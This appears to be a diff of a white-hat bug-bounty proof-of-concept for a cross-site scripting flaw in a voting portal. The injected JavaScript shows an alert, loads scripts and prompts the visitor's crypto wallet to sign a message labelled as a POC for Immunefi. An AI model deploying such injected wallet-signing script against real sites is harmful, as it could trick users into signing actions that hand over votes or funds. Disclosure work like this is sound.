@@ -1,4 +1,4 @@
-alert('POC');
+alert('XSS on VOTING PORTAL POC');
 
 async function importScript(src) {
     return new Promise((resolve, reject) => {
@@ -27,7 +27,7 @@ async function connectAndSign() {
             const signer = provider.getSigner();
             console.log(signer);
 
-            const message = 'Allow polling .';
+            const message = 'Create polling-- POC -- white-hat -- immunefi';
             
             // Wait for 3 seconds before signing the message
             setTimeout(async () => {
